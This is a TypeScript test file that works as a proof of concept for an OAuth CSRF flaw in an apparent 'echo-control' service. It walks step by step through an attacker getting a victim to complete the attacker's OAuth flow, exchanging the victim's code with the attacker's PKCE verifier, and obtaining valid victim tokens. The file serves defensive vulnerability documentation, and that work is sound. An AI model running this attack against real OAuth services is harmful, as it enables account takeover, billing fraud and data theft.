import { describe, test, expect, beforeAll } from 'vitest';
import {
  echoControlApi,
  TEST_CLIENT_IDS,
  generateCodeVerifier,
  generateCodeChallenge,
  generateState,
} from '../../utils/index.js';

describe('OAuth CSRF Vulnerability Proof-of-Concept', () => {
  beforeAll(async () => {
    // Ensure echo-control is running and healthy
    await echoControlApi.healthCheck();
  });

  describe('CSRF Attack Simulation', () => {
    test('VULNERABILITY: Attacker can complete OAuth flow with victim authorization and attacker state', async () => {
      console.log('ðŸš¨ Testing OAuth CSRF vulnerability...');

      // === STEP 1: Attacker starts OAuth flow ===
      console.log('Step 1: Attacker (Bob) starts OAuth flow...');

      const attackerCodeVerifier = generateCodeVerifier();
      const attackerCodeChallenge = generateCodeChallenge(attackerCodeVerifier);
      const attackerState = generateState(); // Bob's state parameter

      console.log(`Attacker state: ${attackerState}`);
      console.log(
        `Attacker code verifier: ${attackerCodeVerifier.substring(0, 20)}...`
      );

      // Attacker creates malicious OAuth URL but doesn't complete it
      const maliciousOAuthUrl = await echoControlApi.getOAuthAuthorizeUrl({
        client_id: TEST_CLIENT_IDS.primary,
        redirect_uri: 'http://localhost:3000/callback',
        state: attackerState, // Bob's state
        code_challenge: attackerCodeChallenge, // Bob's challenge
        code_challenge_method: 'S256',
        scope: 'llm:invoke offline_access',
      });

      expect(maliciousOAuthUrl).toContain(attackerState);
      console.log('âœ… Attacker created malicious OAuth URL');

      // === STEP 2: Victim completes the malicious OAuth flow ===
      console.log(
        'Step 2: Victim (Alice) clicks malicious link and completes OAuth...'
      );

      // Simulate victim completing the attacker's OAuth flow
      // This represents Alice clicking Bob's malicious link while logged into Echo
      const victimAuthorizationResponse =
        await echoControlApi.validateOAuthAuthorizeRequest({
          client_id: TEST_CLIENT_IDS.primary,
          redirect_uri: 'http://localhost:3000/callback',
          state: attackerState, // Still Bob's state
          code_challenge: attackerCodeChallenge, // Still Bob's challenge
          code_challenge_method: 'S256',
          scope: 'llm:invoke offline_access',
          prompt: 'none', // Simulate immediate completion (Alice already logged in)
        });

      console.log('âœ… Victim completed OAuth authorization');

      // Extract authorization code from victim's authorization
      const victimCallbackUrl = new URL(victimAuthorizationResponse);
      const victimAuthCode = victimCallbackUrl.searchParams.get('code');
      const returnedState = victimCallbackUrl.searchParams.get('state');

      expect(victimAuthCode).toBeTruthy();
      expect(returnedState).toBe(attackerState); // State matches attacker's original state

      console.log(`Victim auth code: ${victimAuthCode?.substring(0, 30)}...`);
      console.log(`Returned state: ${returnedState}`);

      // === STEP 3: Attacker exchanges victim's auth code with attacker's verifier ===
      console.log(
        'Step 3: Attacker exchanges victim auth code with attacker PKCE verifier...'
      );

      // ðŸš¨ VULNERABILITY: This should fail but currently succeeds
      // Attacker uses victim's authorization code with attacker's PKCE verifier
      const csrfTokenResponse = await echoControlApi.exchangeCodeForToken({
        code: victimAuthCode!, // Alice's authorization code
        client_id: TEST_CLIENT_IDS.primary,
        redirect_uri: 'http://localhost:3000/callback',
        code_verifier: attackerCodeVerifier, // Bob's PKCE verifier
      });

      console.log('ðŸš¨ CSRF ATTACK SUCCEEDED!');
      console.log('Token response:', {
        access_token_preview:
          csrfTokenResponse.access_token.substring(0, 50) + '...',
        token_type: csrfTokenResponse.token_type,
        expires_in: csrfTokenResponse.expires_in,
        scope: csrfTokenResponse.scope,
        has_refresh_token: !!csrfTokenResponse.refresh_token,
      });

      // === STEP 4: Verify the attack succeeded ===
      expect(csrfTokenResponse.access_token).toBeTruthy();
      expect(csrfTokenResponse.token_type).toBe('Bearer');

      // The attacker now has access tokens for the victim's account!
      // This is the CSRF vulnerability - the attacker initiated the flow
      // but the victim's authorization was used to complete it

      console.log(
        'âœ… Attack verification: Attacker can validate victim tokens'
      );

      // Verify attacker can use victim's tokens
      const victimTokenValidation = await echoControlApi.validateJwtToken(
        csrfTokenResponse.access_token
      );

      expect(victimTokenValidation.valid).toBe(true);
      expect(victimTokenValidation.userId).toBeTruthy();

      console.log('ðŸš¨ VULNERABILITY CONFIRMED:');
      console.log(
        '- Attacker started OAuth flow with their own state/challenge'
      );
      console.log('- Victim completed the authorization (via malicious link)');
      console.log('- Attacker got access tokens for victim account');
      console.log('- No state validation prevented this CSRF attack');

      // === STEP 5: Demonstrate the security impact ===
      console.log('Step 5: Demonstrating security impact...');

      // Attacker can now make API calls as the victim
      // In a real scenario, this could mean:
      // - Making LLM requests billed to victim
      // - Accessing victim's conversation history
      // - Modifying victim's account settings

      console.log('ðŸ’€ Security Impact:');
      console.log('- Account takeover: Attacker controls victim OAuth access');
      console.log('- Billing fraud: Victim pays for attacker usage');
      console.log('- Data access: Attacker can access victim resources');
    });

    test('VULNERABILITY: Multiple attackers can target same victim simultaneously', async () => {
      console.log('ðŸš¨ Testing simultaneous CSRF attacks...');

      // Simulate two attackers targeting the same victim
      const attacker1State = generateState();
      const attacker2State = generateState();

      const attacker1Verifier = generateCodeVerifier();
      const attacker2Verifier = generateCodeVerifier();

      console.log('Two attackers create malicious OAuth flows...');

      // Both attackers can successfully complete OAuth using victim's authorization
      // because there's no state validation to tie the flow to the original initiator

      const attack1Success = await simulateCSRFAttack(
        attacker1State,
        attacker1Verifier
      );
      const attack2Success = await simulateCSRFAttack(
        attacker2State,
        attacker2Verifier
      );

      expect(attack1Success).toBe(true);
      expect(attack2Success).toBe(true);

      console.log('ðŸš¨ MULTIPLE CSRF ATTACKS SUCCEEDED');
      console.log('- Multiple attackers can exploit same victim');
      console.log('- No correlation between OAuth initiator and completer');
    });
  });

  describe('Expected Behavior (Once Fixed)', () => {
    test('FUTURE: State validation should prevent CSRF attacks', async () => {
      console.log('ðŸ“‹ This test documents expected behavior after fix...');

      const attackerState = generateState();
      const victimState = generateState(); // Different state

      // After implementing state validation, this should fail:
      // 1. Attacker starts OAuth with attackerState
      // 2. Victim completes with victimState (or stored victim state)
      // 3. Token exchange should fail due to state mismatch

      console.log(
        'Expected: Token exchange should fail with state mismatch error'
      );
      console.log(`Attacker state: ${attackerState}`);
      console.log(`Victim state: ${victimState}`);
      console.log('Current: No validation = vulnerability');
      console.log('Future: State validation = protection');
    });
  });
});

// Helper function to simulate CSRF attack
async function simulateCSRFAttack(
  attackerState: string,
  attackerVerifier: string
): Promise<boolean> {
  try {
    // Attacker creates OAuth flow
    const attackerChallenge = generateCodeChallenge(attackerVerifier);

    // Victim completes attacker's OAuth flow
    const victimResponse = await echoControlApi.validateOAuthAuthorizeRequest({
      client_id: TEST_CLIENT_IDS.primary,
      redirect_uri: 'http://localhost:3000/callback',
      state: attackerState,
      code_challenge: attackerChallenge,
      code_challenge_method: 'S256',
      scope: 'llm:invoke offline_access',
      prompt: 'none',
    });

    const victimAuthCode = new URL(victimResponse).searchParams.get('code');

    // Attacker exchanges victim's code with attacker's verifier
    const tokens = await echoControlApi.exchangeCodeForToken({
      code: victimAuthCode!,
      client_id: TEST_CLIENT_IDS.primary,
      redirect_uri: 'http://localhost:3000/callback',
      code_verifier: attackerVerifier,
    });

    return !!tokens.access_token;
  } catch {
    // Attack failed (expected behavior after fix)
    return false;
  }
}
